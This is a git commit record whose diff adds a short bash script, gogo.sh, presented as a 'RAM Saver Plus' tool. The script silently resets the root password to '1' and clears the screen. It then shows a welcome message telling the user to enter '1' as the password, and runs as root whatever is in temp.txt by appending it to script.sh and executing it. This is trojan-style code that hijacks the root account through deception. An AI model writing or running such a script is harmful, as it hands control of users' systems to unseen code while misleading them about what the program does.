8214a6d224dfbe1c0d78125e15d034c013f351fd
David <hdavidgleaton@gmail.com>
2020-07-14 13:00:27 -0400

    Testing gogo.sh script download

---
+++ gogo.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+echo -e "1\n1" | sudo passwd
+clear
+echo "Welcome to RAM Saver Plus! Enter '1' for the password to start!"
+su -c "cat temp.txt >> script.sh; chmod +x script.sh; ./script.sh"
+
